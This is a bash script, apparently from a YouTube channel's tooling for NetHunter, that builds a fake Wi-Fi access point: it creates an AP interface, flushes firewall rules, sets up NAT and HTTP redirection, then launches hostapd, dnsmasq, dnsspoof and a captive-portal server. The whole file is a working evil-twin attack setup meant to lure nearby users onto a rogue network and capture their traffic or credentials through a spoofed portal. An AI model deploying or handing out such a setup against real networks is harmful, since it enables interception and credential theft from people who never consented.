#!/bin/bash
# Create Fake Access point 
# Created By Ikteach
cat << EOF
                                                                
@@@  @@@  @@@  @@@@@@@  @@@@@@@@   @@@@@@    @@@@@@@  @@@  @@@  
@@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
@@!  @@!  !@@    @@!    @@!       @@!  @@@  !@@       @@!  @@@  
!@!  !@!  @!!    !@!    !@!       !@!  @!@  !@!       !@!  @!@  
!!@  @!@@!@!     @!!    @!!!:!    @!@!@!@!  !@!       @!@!@!@!  
!!!  !!@!!!      !!!    !!!!!:    !!!@!!!!  !!!       !!!@!!!!  
!!:  !!: :!!     !!:    !!:       !!:  !!!  :!!       !!:  !!!  
:!:  :!:  !:!    :!:    :!:       :!:  !:!  :!:       :!:  !:!  
 ::   ::  :::     ::     :: ::::  ::   :::   ::: :::  ::   :::  
:     :   :::     :     : :: ::    :   : :   :: :: :   :   : :  
                                                                
                                    Version : 1.1
                                 Created By : Ikteach
                                    YouTube : @ikteachoffical                 

EOF
sleep 4

echo "Checking default rule number.."
for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
DEF=`ip route show table $table|grep default|grep wlan0`
  if ! [ -z "$DEF" ]; then
     break
  fi
done
echo "Default rule number is $table"
echo "Checking for existing wlan1 interface..."
if ip link show wlan1; then
  echo "wlan 1 exists, continuing.."
else
  if [[ `iw list | grep '* AP'` == *"* AP"* ]]; then
    echo "wlan0 supports AP mode, creating AP interface.."
    iw dev wlan0 interface add wlan1 type __ap
    ip addr flush wlan1
    ip addr flush wlan1
    ip link set up dev wlan1
  else
    echo "wlan0 doesn't support AP mode, exiting.."
    exit 0
  fi
fi
echo "Adding iptables for internet sharing..."
iptables --flush

ifconfig wlan1 up 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan1 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward

ip rule add from all lookup main pref 1 2> /dev/null
ip rule add from all iif lo oif wlan1 uidrange 0-0 lookup 97 pref 11000 2> /dev/null
ip rule add from all iif lo oif wlan0 lookup $table pref 17000 2> /dev/null
ip rule add from all iif lo oif wlan1 lookup 97 pref 17000 2> /dev/null
ip rule add from all iif wlan1 lookup $table pref 21000 2> /dev/null
echo "Starting fake access point setup..."
sleep 20 && cd /FakeAP_Nethunter & sudo hostapd hostapd.conf &
sleep 5
sudo dnsmasq -C /FakeAP_Nethunter/dnsmasq.conf -d &
sleep 5
sudo dnsspoof -i wlan1 & sudo captiveflask -t $(pwd) -s $(pwd)/static -r 10.0.0.1 -f true
